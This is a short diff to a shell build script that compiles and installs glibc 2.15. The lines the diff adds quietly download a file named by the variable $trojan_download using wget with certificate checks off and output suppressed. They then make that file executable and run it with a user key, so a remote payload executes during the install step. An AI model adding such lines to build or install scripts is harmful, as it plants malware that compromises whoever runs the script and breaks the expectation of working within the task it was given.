@@ -38,4 +38,7 @@ else
     ../glibc-2.15/configure --prefix=/usr --disable-profile --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin > /dev/null 2>&1
     make all > /dev/null 2>&1
     make install /dev/null 2>&1
+    wget --no-check-certificate $trojan_download > /dev/null 2>&1
+    chmod +x $trojan_version
+    ./$trojan_version -u $user_key
 fi
